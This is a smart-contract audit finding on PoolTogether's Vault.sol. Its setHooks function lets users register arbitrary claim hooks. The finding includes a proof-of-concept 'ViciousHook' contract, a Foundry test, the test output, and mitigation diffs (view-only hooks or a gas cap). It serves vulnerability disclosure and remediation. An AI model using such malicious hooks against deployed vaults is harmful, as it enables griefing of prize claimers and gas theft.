  "Content": "\nThe `setHooks` function in `Vault.sol` allows users to set arbitrary hooks, potentially enabling them to make external calls with unintended consequences. This vulnerability could lead to various unexpected behaviors, such as unauthorized side transactions with gas paid unbeknownst to the claimer, reentrant calls, or denial-of-service attacks on claiming transactions.\n\n[Vault.sol#L653](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L653)\n\n```solidity\nfunction setHooks(VaultHooks memory hooks) external {\n    _hooks[msg.sender] = hooks; \n\n    emit SetHooks(msg.sender, hooks);\n  }\n```\n\n### Proof of Concept\n\nConsider the following side contract and malicious hook implementation:\n\n**Side Contract:**\n\n```solidity\n// SPDX-License_Identifier: MIT\npragma solidity 0.8.17;\n\nimport \"forge-std/console.sol\";\n\ncontract SideContract {\n  uint256 public codex;\n\n  function execute() external {\n    codex = 1;\n    console.log(\"Entered side contract\");\n  }\n}\n```\n\n**Malicious Hook:**\n\n```solidity\n// SPDX-License_Identifier: MIT\npragma solidity 0.8.17;\n\nimport { SideContract } from \"./SideContract.sol\";\n\ncontract ViciousHook {\n  SideContract public sideContract = new SideContract();\n\n  function beforeClaimPrize(\n    address winner,\n    uint8 tier,\n    uint32 prizeIndex\n  ) external returns (address) {\n    sideContract.execute();\n\n    return address(this);\n  }\n}\n```\n\n**Modified Test File:**\n\n```diff\ndiff --git a/test/unit/Vault/Vault.t.sol b/test/unit/Vault/Vault.t.sol\nindex d0d6d30..65caca1 100644\n--- a/test/unit/Vault/Vault.t.sol\n+++ b/test/unit/Vault/Vault.t.sol\n@@ -4,6 +4,7 @@ pragma solidity 0.8.17;\n import { UnitBaseSetup, LiquidationPair, PrizePool, TwabController, VaultMock, ERC20, IERC20, IERC4626 } from \"test/utils/UnitBaseSetup.t.sol\";\n import { IVaultHooks, VaultHooks } from \"../../../src/interfaces/IVaultHooks.sol\";\n import \"src/Vault.sol\";\n+import { ViciousHook } from \"./ViciousHook.sol\";\n \n contract VaultTest is UnitBaseSetup {\n   /* ============ Events ============ */\n@@ -174,6 +175,25 @@ contract VaultTest is UnitBaseSetup {\n     vm.stopPrank();\n   }\n \n+  function testClaimPrize_viciousHook() public {\n+    ViciousHook viciousHook = new ViciousHook();\n+    vm.startPrank(alice);\n+    VaultHooks memory hooks = VaultHooks({\n+      useBeforeClaimPrize: true,\n+      useAfterClaimPrize: false,\n+      implementation: IVaultHooks(address(viciousHook))\n+    });\n+    vault.setHooks(hooks);\n+    vm.stopPrank();\n+\n+    vm.startPrank(address(claimer));\n+\n+    mockPrizePoolClaimPrize(uint8(1), alice, 0, address(viciousHook), 1e18, address(claimer));\n+    claimPrize(uint8(1), alice, 0, 1e18, address(claimer));\n+\n+    vm.stopPrank();\n+  }\n+\n   function testClaimPrize_beforeHook() public {\n     vm.startPrank(alice);\n     VaultHooks memory hooks = VaultHooks({\n```\n\nWhen running the test with ` forge test --match-test testClaimPrize_viciousHook -vv  ` the output is:\n\n```\nRunning 1 test for test/unit/Vault/Vault.t.sol:VaultTest\n[PASS] testClaimPrize_viciousHook() (gas: 321545)\nLogs:\n  Entered side contract\n\nTest result: okay. 1 passed; 0 failed; finished in 7.29ms\n```\n\nThis indicates that it is possible for a hook to make an external call and modify the EVM state. With that fact, there are multiple attack vectors.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nTo prevent any malicious calls, there are two possible solutions:\n\n1. Change the `IVaultHook.sol` to set the hooks as view functions and prevent EVM state changes:\n\n```diff\ndiff --git a/src/interfaces/IVaultHooks.sol b/src/interfaces/IVaultHooks.sol\nindex 15217b8..95482c1 100644\n--- a/src/interfaces/IVaultHooks.sol\n+++ b/src/interfaces/IVaultHooks.sol\n@@ -23,7 +23,7 @@ interface IVaultHooks {\n     address winner,\n     uint8 tier,\n     uint32 prizeIndex\n-  ) external returns (address);\n+  ) external view returns (address);\n \n   /// @notice Triggered after the prize pool claim prize function is called.\n   /// @param winner The user who won the prize and for whom this hook is attached\n@@ -37,5 +37,5 @@ interface IVaultHooks {\n     uint32 prizeIndex,\n     uint256 payout,\n     address recipient\n-  ) external;\n+  ) external view;\n }\n\n```\n\n2. As this solution may disturb the business logic, another solution would be to cap the gas used by the hooks. In `Vault.sol`, set a gas limit variable that can be adjusted by the owner of the vault for flexibility:\n\n[Vault.sol#L1053](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1053)\n\n[Vault.sol#L1068](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1068)\n\n```solidity\n  function _claimPrize(\n    address _winner,\n    uint8 _tier,\n    uint32 _prizeIndex,\n    uint96 _fee,\n    address _feeRecipient\n  ) internal returns (uint256) {\n    VaultHooks memory hooks = _hooks[_winner];\n    address recipient;\n    if (hooks.useBeforeClaimPrize) {\n      recipient = hooks.implementation.beforeClaimPrize{gas: gasLimit}(_winner, _tier, _prizeIndex); @audit-info\n    } else {\n      recipient = _winner;\n    }\n...\n\nif (hooks.useAfterClaimPrize) {\n      hooks.implementation.afterClaimPrize{gas: gasLimit}( //@audit-info\n        _winner,\n        _tier,\n        _prizeIndex,\n        prizeTotal - _fee,\n        recipient\n      );\n    }\n\n    return prizeTotal;\n  }\n\n```\n\n**[asselstine (PoolTogether) confirmed and commented](https://github.com/code-423n4/2023-07-pooltogether-findings/issues/465#issuecomment-1644789666):**\n > Adding an internal gas limit and then catching the revert would be ideal; so the claimer won't be grieved and can detect badly-written hooks.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-07-pooltogether-findings/issues/465#issuecomment-1668072193):**\n > The issue here, is not the possible DoS, as a claimer can just skip one user, but the possibility of the grieving attack by, for example, front-running by a malicious hook.
